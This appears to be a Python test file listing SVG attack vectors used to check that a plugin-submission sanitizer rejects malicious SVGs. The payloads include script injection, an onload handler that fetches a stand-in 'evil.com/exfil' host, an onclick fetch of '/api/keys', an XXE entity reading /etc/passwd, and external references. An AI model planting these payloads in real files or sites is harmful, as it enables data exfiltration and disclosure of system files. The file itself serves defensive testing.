"""SVG security test vectors for community plugin submission validation.

These test cases exercise the _sanitize_svg function against known
attack vectors to ensure malicious SVGs are rejected before reaching
the geometry engine.
"""

# ── Known SVG attack vectors ─────────────────────────────────────────

SVG_ATTACK_VECTORS: dict[str, str] = {
    # Script injection
    "script_tag": '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>',

    # Event handler
    "onload_handler": '<svg xmlns="http://www.w3.org/2000/svg" onload="fetch(\'https://evil.com/exfil\')">'
    '<rect width="100" height="100"/></svg>',
    "onclick_handler": '<svg><rect onclick="fetch(\'/api/keys\')" width="100" height="100"/></svg>',

    # External entity
    "dtd_entity": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
    '<svg>&xxe;</svg>',

    # Foreign object
    "foreign_object": '<svg xmlns="http://www.w3.org/2000/svg">'
    '<foreignObject><iframe src="https://evil.com"></iframe></foreignObject></svg>',

    # External reference (href)
    "external_ref_href": '<svg xmlns="http://www.w3.org/2000/svg">'
    '<image href="https://evil.com/exfil.png" width="100" height="100"/></svg>',

    # External reference (xlink:href)
    "external_ref_xlink": '<svg xmlns="http://www.w3.org/2000/svg">'
    '<use xlink:href="https://evil.com/evil.svg#payload"/>',
}

# ── Security scan test fixture ───────────────────────────────────────

def test_svg_sanitization(sanitize_fn):
    """Run all SVG attack vectors through a sanitization function.

    Returns list of (name, passed, message) tuples.
    """
    results = []
    for name, payload in SVG_ATTACK_VECTORS.items():
        try:
            sanitize_fn(payload)
            results.append((name, False, "FAILED — payload was not rejected"))
        except ValueError:
            results.append((name, True, "OK — blocked"))
        except Exception as exc:
            results.append((name, False, f"ERROR — unexpected exception: {exc}"))
    return results
